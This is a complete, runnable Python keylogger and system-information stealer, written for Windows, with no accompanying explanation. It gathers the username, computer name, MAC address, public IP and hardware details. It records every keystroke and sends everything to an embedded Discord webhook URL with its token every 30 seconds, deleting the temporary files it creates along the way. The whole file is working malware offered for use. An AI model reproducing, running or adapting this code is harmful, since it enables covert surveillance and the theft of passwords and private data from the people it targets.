#getinfo
import requests
from re import findall
from getmac import get_mac_address
import platform
import psutil

#Keylogger
import keyboard
from threading import Timer
from datetime import datetime

#General
import os
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = 30
WEBHOOK = "https://discord.com/api/webhooks/1232395876358688849/dQ4XFhHHUhCA9X1yiIwJAsK5ENRGnDBAATfGH01DpToBWnQ09wrxgdV2eCMbpXRwiEvL"

#Getinfo
windows_enviroment={
    'app_local':'LOCALAPPDATA',
    'app_roaming':'APPDATA',
    'computer_name':'COMPUTERNAME',
    'user_path':'HOMEPATH',
    'username':'USERNAME'
}

def get_computer_information():

    # Retrieve Windows environment variables
    computer_user_name = os.getenv(key=windows_enviroment.get('username'))
    computer_name = os.getenv(key=windows_enviroment.get('computer_name'))

    # Get system information
    os_version = platform.platform()
    processor = platform.processor()
    memory = psutil.virtual_memory()
    total_memory = memory.total
    available_memory = memory.available

    # Get other information
    computer_mac_address = get_mac_address()
    ip_address = requests.get('https://api.ipify.org?format=json').json()['ip']

    TEMP_File_path= os.path.join(os.environ["temp"])
    TEMP_File_path= TEMP_File_path + r'\TMP37289.txt'

        # Write system information to a temporary file
    with open(TEMP_File_path, 'w+', encoding="utf-8") as inforead:
        inforead.write(f'Operating System Version: {os_version}\n')
        inforead.write(f'Processor: {processor}\n')
        inforead.write(f'Total Memory: {total_memory}\n')
        inforead.write(f'Available Memory: {available_memory}\n')
        inforead.write(f'Username: {computer_user_name}\n')
        inforead.write(f'Computer Name: {computer_name}\n')
        inforead.write(f'Computer Mac Address: {computer_mac_address}\n')
        inforead.write(f'IP Address: {ip_address}\n')

    discord_embeded={
        "title": "Computer Information", 
        "color": 3201515, 
        "fields": [
            {"name": "Name","value": f"{computer_name}"},
            {"name": "User","value": f"{computer_user_name}" },
            {"name": "Mac Addrr","value": f"{computer_mac_address}"},
            {"name": "IP Addrr","value": f"{ip_address}"},
            {"name": "Operating System Version","value": f"{os_version}"},
            {"name": "Processor","value": f"{processor}"},
            {"name": "Total Memory","value": f"{total_memory}"},
        ]
        }
        
    latest_jsondata = {
        "content": "" ,
        "username": f"{computer_user_name} | {computer_name}",
        "embeds": [discord_embeded],}
    
    requests.post(WEBHOOK, json=latest_jsondata)
    os.remove(TEMP_File_path)


#Keylogger
class Keylogger: 
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        if len(self.log) > 2000:
            path = os.environ["temp"] + "\\3218932TMP.txt"
            with open(path, 'w+') as file:
                file.write(f"Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            webhook = DiscordWebhook(url=WEBHOOK)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='3218932TMP.txt')
            webhook.execute()
            os.remove(path)
        else:
            discord_embeded = {
                "title": f"Report From {self.username}",
                "description": f"Time: {self.end_dt}",
                "color": 3201515,
                "fields": [
                    {"name": "Log:", "value": f"{self.log}"}
                ]
            }

            latest_jsondata = {
                "content": "",
                "username": f"{self.username} | {platform.node()}",
                "embeds": [discord_embeded]
            }

            requests.post(WEBHOOK, json=latest_jsondata)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
    
if __name__ == "__main__":
    get_computer_information()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
    keylogger.start()
    